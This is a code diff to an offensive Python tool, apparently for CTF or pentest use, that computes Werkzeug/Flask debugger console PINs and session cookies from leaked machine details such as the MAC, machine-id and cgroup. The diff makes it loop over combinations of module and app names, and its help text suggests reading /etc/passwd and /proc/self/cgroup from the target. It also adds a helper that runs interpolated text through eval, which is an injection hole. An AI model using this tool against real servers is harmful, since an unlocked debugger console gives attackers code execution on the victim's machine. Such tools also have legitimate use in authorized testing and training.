@@ -22,7 +22,8 @@
 
 
 import hashlib
-from itertools import chain
+from itertools import chain, combinations
+from colorama import Fore, Style
 import time
 import argparse
 import getpass
@@ -137,6 +138,9 @@ __          __             _
                 Channel: https://t.me/SidneyJobChannel
 """)
 
+def print_c(text, color):
+	eval(f'print(Fore.{color} + """{text}""" + Style.RESET_ALL, end="")')
+
 def main():
     logo()
     if len(sys.argv) > 1:
@@ -160,8 +164,8 @@ cgroup           === {cgroup}
 
     parser.add_argument("--username", dest="username", type=str, help="The username of the user who launched the application. Try to read /etc/passwd or /proc/self/cgroup", default='www-data') # www-data
     parser.add_argument("--path", dest="path",required=True, type=str, help="Path to Flask")   # REQUIRED
-    parser.add_argument("--modname", dest="modname", type=str, help="Modname (Default: flask.app)",default='flask.app') # flask.app
-    parser.add_argument("--appname", dest="appname", type=str, help="Appname (Default: Flask)",default='Flask') # Flask
+    parser.add_argument("--modname", dest="modname", type=str, help="Modname (Default: flask.app)") # flask.app
+    parser.add_argument("--appname", dest="appname", type=str, help="Appname (Default: Flask)") # Flask
 
 
     parser.add_argument("--mac", dest="mac", required=True, type=str, help="MAC address any interface") # REQUIRED
@@ -170,6 +174,13 @@ cgroup           === {cgroup}
     
     args = parser.parse_args()
 
+    modnames = ["flask.app", "werkzeug.debug"]
+    appnames = ["wsgi_app", "DebuggedApplication", "Flask"]
+
+    if args.appname:
+        appnames.append(args.appname)
+    if args.modname:
+        modnames.append(args.modname)
 
     mch_id = b""
     mch_id += args.mch_id.encode("UTF-8")
@@ -177,15 +188,24 @@ cgroup           === {cgroup}
     mch_id += cgroup_file
     
     mac = int("".join(args.mac.split(":")),16)
-    res = gen_pin(args.username, mac, mch_id, args.path, args.modname, args.appname)
-    
-    cookie = generate_cookie(res[0])
-    
-    if res[0] != '' and res[1] != '':
-        print("\n[+] SUCCESS!")
-        print(f'[*] PIN: {res[0]}\n[*] Cookie: {res[1]}={cookie}')
-    else:
-        print("[-] Error!")
+
+    for mod in modnames:
+        for app in appnames:
+            res = gen_pin(args.username, mac, mch_id, args.path, mod, app)
+            cookie = generate_cookie(res[0])
+
+            if res[0] != '' and res[1] != '':
+                print_c("[+] Success!", "GREEN")
+                print(f"""
+[*] PIN: {res[0]}
+[*] Cookie: {res[1]}={cookie}
+[*] Modname: {mod}
+[*] Appname: {app}
+                """)
+            else:
+                print("[-] Error!")
+
+    print_c(f"[+] {len(modnames) * len(appnames)} payloads are successfully generated!\n", "GREEN")
 
 
 if __name__ == "__main__":
